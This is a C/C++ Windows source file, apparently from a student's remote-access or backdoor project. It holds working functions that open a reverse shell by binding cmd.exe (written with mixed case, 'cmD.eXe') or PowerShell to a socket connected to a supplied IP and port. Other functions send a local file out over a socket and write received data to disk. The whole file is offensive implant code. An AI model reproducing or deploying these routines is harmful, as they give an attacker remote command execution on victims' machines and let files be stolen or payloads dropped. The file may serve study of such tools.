#include "stdafx.h"
#pragma warning(disable:4996) 


WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;


int spawnInteractiveShell(char* ip_addr, int port)
{
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
		(unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(port);
	hax.sin_addr.s_addr = inet_addr(ip_addr);

	if (WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL))
	{
		debug("[-] Error al conectarse al objetivo");
		return 1;
	}

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	TCHAR commandLine[256] = L"cmD.eXe";
	if (!CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi))
	{
		debug("[-] Error al spawnear shell");
		return 1;
	}

	return 0;
}

int spawnInteractivePowerShell(char* ip_addr, int port)
{
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
		(unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(port);
	hax.sin_addr.s_addr = inet_addr(ip_addr);

	if (WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL))
	{
		debug("[-] Error al conectarse al objetivo");
		return 1;
	}

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	TCHAR commandLine[256] = L"PowerShell.exe";
	if (!CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi))
	{
		debug("[-] Error al spawnear shell");
		return 1;
	}

	return 0;
}

int downloadFile(SOCKET sock, char* fichero)
{
	debug("[+] Sending file .. ");

	FILE *file;
	char* buffer;
	size_t result;

	file = fopen(fichero, "rb");
	//file = fopen("C:\\Users\\iker\\Desktop\\TFG_memoria.pdf", "rb");

	if (!file)
	{
		debug("[-] Error while reading the file");
		closesocket(sock);
		return 1;
	}

	// allocate memory to contain the whole file:
	fseek(file, 0, SEEK_END);
	int len = ftell(file);      // number of bytes to be sent
	rewind(file);
	buffer = (char*)malloc(len + 1);
	if (buffer == NULL) { debug("[-] Memory error"); exit(2); }

	int SizeCheck = 0;
	while (SizeCheck < len)
	{
		int Read = fread_s(buffer, len, sizeof(char), len, file);
		int Sent = send(sock, buffer, Read, 0);
		SizeCheck += Sent;
		//printf("[+] Filesize: %d\nSizecheck: %d\nRead: %d\nSent: %d\n\n", len, SizeCheck, Read, Sent);
	}

	fclose(file);
	Sleep(500);
	free(buffer);
	closesocket(sock);

	return 0;
}

int uploadFile(SOCKET sock, char* fichero)
{
	debug("[+] Uploading file .. \n");

	FILE *file;
	char* buffer;
	size_t result;
	int received_bytes = 0;
	DWORD timeout = 1000;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);

	file = fopen(fichero, "wb");	// Crear o sobreescribir fichero
									//file = fopen("C:\\Users\\iker\\Desktop\\TFG_memoria.pdf", "rb");

	if (!file)
	{
		debug("[-] Error while writing the file\n");
		closesocket(sock);
		return 1;
	}
	;
	int len = 1499;      // Read buffer
	buffer = (char*)malloc(len + 1);
	if (buffer == NULL) { debug("[-] Memory error"); exit(2); }

	do {
		received_bytes = recv(sock, buffer, len, 0);
		if (received_bytes > 0)
		{
			debug("[+] Bytes received: "+ received_bytes );
			fwrite(buffer, sizeof(char), received_bytes, file);
		}
		else if (received_bytes == 0)
		{
			debug("[-] Connection closed\n");
			fclose(file);
			free(buffer);
			Sleep(500);
			closesocket(sock);
			return 0;
		}
		else
			debug("[-] recv failed: "+ WSAGetLastError());
	} while (received_bytes > 0);


	fclose(file);
	free(buffer);
	Sleep(500);
	closesocket(sock);

	return 0;
}